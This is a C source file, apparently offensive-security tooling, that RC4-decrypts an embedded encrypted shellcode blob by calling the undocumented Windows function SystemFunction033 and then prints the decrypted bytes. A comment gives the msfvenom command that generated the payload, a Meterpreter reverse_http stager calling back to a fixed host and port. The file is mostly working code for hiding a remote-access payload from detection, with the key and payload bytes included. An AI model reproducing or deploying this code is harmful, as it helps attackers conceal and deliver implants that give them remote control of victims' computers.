#include <windows.h>
#include <stdio.h>

/*
	Based on https://osandamalith.com/2022/11/10/encrypting-shellcode-using-systemfunction032-033/
	
	SystemFunction033 is an undocumented function that can perform RC4 encryption/decryption on a buffer.
	Similar to XOR, calling SystemFunction033 on an a buffer containing unencrypted data encrypts the data in the buffer.
	Calling SystemFunction033 on an a buffer containing encrypted data decrypts the data in the buffer.
*/

// compile: 
//  cl.exe /nologo /W0 /DNDEBUG /Tcrc4.c /link /OUT:rc4.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

// Function prototype for SystemFunction033
typedef NTSTATUS(WINAPI* _SystemFunction033)(
	struct ustring* memoryRegion,
	struct ustring* keyPointer);

// Define our ustring struct
struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} _data, key;


int main() {
	// declare SystemFunction033 for use
	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary((LPCSTR)"Advapi32"), (LPCSTR)"SystemFunction033");

	
	// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o met.bin
	// python3 rc4_encrypt.py -i met.bin
	char _key[] = "XK53QSV2MSEPPKAU";
	unsigned char shellcode[] = {0xee, 0x8, 0x63, 0x24, 0x95, 0x5e, 0xb3, 0xf4, 0xd6, 0x8a, 0xbe, 0xbb, 0xb3, 0xd0, 0x7f, 0x9f, 0xfc, 0x67, 0x13, 0x75, 0x6b, 0xd0, 0x5c, 0xc7, 0x9d, 0x39, 0x21, 0x20, 0x64, 0x98, 0x53, 0xe4, 0x96, 0x3a, 0x40, 0x35, 0xb2, 0xc1, 0xe2, 0xd2, 0xc2, 0xe, 0x7b, 0x7, 0xb2, 0xae, 0x14, 0xd7, 0x3, 0xa7, 0xcf, 0xb3, 0x13, 0x86, 0xc5, 0x8, 0x2b, 0x8d, 0x7c, 0xa7, 0xdd, 0x94, 0xd8, 0x47, 0x8, 0xee, 0xb7, 0x1b, 0xf2, 0x83, 0x32, 0x85, 0x8a, 0xbb, 0xee, 0x46, 0xd3, 0x9c, 0xd8, 0x75, 0xe0, 0xc0, 0x5e, 0x48, 0x4a, 0xb, 0xaf, 0xb6, 0x97, 0x57, 0x96, 0x96, 0x47, 0x70, 0xa2, 0x99, 0x15, 0x30, 0xbd, 0x70, 0x36, 0xa1, 0x47, 0x79, 0x6a, 0xec, 0x46, 0x8b, 0x7e, 0x46, 0xc5, 0xbe, 0x30, 0x6b, 0x1d, 0x4, 0xfb, 0x4f, 0x5a, 0xa4, 0x77, 0xfa, 0xbf, 0x2f, 0xbd, 0xd4, 0x6d, 0x73, 0xd3, 0xc9, 0xff, 0xe4, 0x78, 0x14, 0x47, 0xaa, 0xf8, 0x90, 0x29, 0x61, 0x1f, 0xa9, 0xcd, 0xb7, 0xac, 0xfe, 0x35, 0x40, 0x5c, 0x61, 0x2b, 0xf9, 0x2e, 0x4b, 0x40, 0xdd, 0x7e, 0x31, 0xe3, 0x3c, 0xd1, 0x20, 0xca, 0x60, 0xaf, 0x56, 0x4e, 0xfd, 0x89, 0xa4, 0x48, 0x70, 0x6b, 0xf0, 0xc2, 0x64, 0x75, 0x22, 0xd8, 0xfc, 0x78, 0x13, 0xb7, 0x2a, 0x0, 0x41, 0xfd, 0xe9, 0x69, 0x79, 0x73, 0x34, 0x70, 0x3d, 0x9b, 0xd5, 0x2c, 0x85, 0x47, 0x9d, 0x22, 0x80, 0x30, 0x42, 0xaa, 0xa3, 0xe9, 0xe0, 0xf, 0x8f, 0x31, 0xb6, 0x0, 0xef, 0xdb, 0x70, 0xe6, 0x64, 0x1a, 0xd0, 0xba, 0x54, 0x89, 0x8a, 0xe6, 0xff, 0x4d, 0xca, 0x46, 0x43, 0xd1, 0xa5, 0xcc, 0x43, 0xa1, 0x69, 0x75, 0xb6, 0x5b, 0xe8, 0x2, 0xf3, 0x52, 0xab, 0x28, 0xc3, 0xdb, 0xd2, 0x54, 0x7, 0xa2, 0x67, 0xe, 0x91, 0x4, 0x5e, 0x23, 0xbe, 0xa0, 0x32, 0x7a, 0x44, 0x96, 0xdd, 0x1f, 0xbb, 0x5b, 0x1a, 0xde, 0xb5, 0x8f, 0xea, 0xb1, 0x53, 0x28, 0x50, 0xa, 0x5f, 0xdf, 0x25, 0x4a, 0xf, 0x18, 0x5c, 0x15, 0x12, 0xbe, 0xb3, 0x3c, 0x6e, 0x87, 0xc, 0x83, 0x2a, 0xfb, 0x8e, 0x69, 0x4f, 0xe0, 0x3c, 0x9f, 0xfe, 0x9f, 0x14, 0x60, 0x4b, 0xa, 0x5a, 0xc9, 0x69, 0x37, 0x67, 0x31, 0x3b, 0xb5, 0xe5, 0x74, 0xc5, 0xb3, 0x11, 0x4e, 0xab, 0x9c, 0x46, 0xcd, 0xf9, 0x9b, 0x72, 0xde, 0xf8, 0xb4, 0x4, 0xb1, 0x7e, 0x76, 0xc7, 0xb3, 0xb1, 0xe9, 0x23, 0x7a, 0xcc, 0xf1, 0x90, 0x49, 0xee, 0xe6, 0x3d, 0x18, 0x84, 0xc0, 0x9e, 0x1a, 0xe3, 0xe4, 0xb8, 0x21, 0x3d, 0xf6, 0xb6, 0x39, 0x85, 0x94, 0x56, 0x6e, 0x12, 0xed, 0xb3, 0x62, 0x51, 0x69, 0x2f, 0x7e, 0xc9, 0xaf, 0xb5, 0x73, 0xa, 0xd3, 0xc1, 0x53, 0xb7, 0x21, 0x87, 0x3, 0x6a, 0x51, 0xde, 0x12, 0xf9, 0x62, 0x31, 0x1f, 0xb2, 0x14, 0x48, 0x75, 0xc8, 0xb2, 0x5c, 0x62, 0x3, 0x29, 0xe4, 0xa4, 0xb9, 0xa0, 0x7a, 0xea, 0x6e, 0x6, 0xf4, 0x53, 0xaf, 0x8d, 0xf3, 0x7a, 0xd5, 0xdf, 0xc9, 0x1e, 0x79, 0x4f, 0x4e, 0xe8, 0x99, 0xcc, 0x75, 0xd4, 0x9, 0x12, 0xc8, 0xff, 0xf1, 0x9b, 0x31, 0xc2, 0x77, 0x89, 0x8f, 0x9b, 0x11, 0x1c, 0xab, 0xd, 0x7b, 0xa8, 0x33, 0xab, 0x9a, 0xc7, 0x57, 0xe, 0xaf, 0x16, 0x68, 0x9a, 0x83, 0x33, 0xff, 0x64, 0x5e, 0xea, 0xb9, 0xcc, 0xcd, 0x77, 0xc1, 0x2f, 0x71, 0x40, 0xcf, 0x4a, 0xdd, 0xe6, 0x5a, 0xe2, 0x40, 0x15, 0xf7, 0x6c, 0xe0, 0x79, 0xc9, 0xd8, 0xc0, 0xab, 0x78, 0x9a, 0xef, 0x62, 0xda, 0x83, 0x3d, 0x62, 0xbc, 0x53, 0xff, 0x92, 0x3a, 0xfd, 0x17, 0xf3, 0x2, 0xd3, 0x91, 0xc6, 0xf, 0x95, 0xb9, 0xd5, 0xd6, 0x6d, 0x42, 0x76, 0x1, 0xad, 0xb1, 0xc9, 0xf1, 0xc1, 0xeb, 0x35, 0xa2, 0x92, 0xb2, 0x8e, 0x71, 0xdb, 0x8a, 0x5c, 0xbd, 0x5c, 0xe6, 0x91, 0x66, 0x18, 0xfe, 0x4d, 0x37, 0x4, 0xc5, 0x6e, 0x9e, 0x1e, 0x73, 0xc9, 0x5c, 0x27, 0x47, 0x74, 0xb0, 0x45, 0xba, 0xf, 0x26, 0x9d, 0xad, 0xa, 0x18, 0xa6, 0xf8, 0x2e, 0x29, 0x56, 0x6, 0xd0, 0xcc, 0x38, 0x66, 0x2d, 0x85, 0x9e, 0xee, 0x27, 0x2, 0xe0, 0x8b, 0x29, 0xb9, 0x94, 0xc9, 0x7, 0xa8, 0x4, 0xf5, 0x5, 0x6c, 0xbf, 0x8b, 0x21, 0xbe, 0x21, 0xa5, 0xec, 0x54, 0x9d, 0xdf};
	
	// declare a variable for our shellcode size
 	unsigned int shellcode_size = sizeof(shellcode);
	
	// Declare a buffer for storing our shellcode
	PVOID buffer = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	
	// copy shellcode to memory
	memcpy(buffer, shellcode, shellcode_size);
	
	// create a new struct from our key
	key.Buffer = (&_key);
	key.Length = 16;
 
	// create a new struct from the buffer we allocated
	_data.Buffer = buffer;
	_data.Length = shellcode_size;
 
	SystemFunction033(&_data, &key);
 
 	int idx = 0;
	while ( idx < _data.Length)
	{
		if (idx == (sizeof(shellcode) - 1) )
		{
			printf("0x%02x ", _data.Buffer[idx]);
		}
		else
		{
			printf("0x%02x, ", _data.Buffer[idx]);
		}
		idx++;
	}
}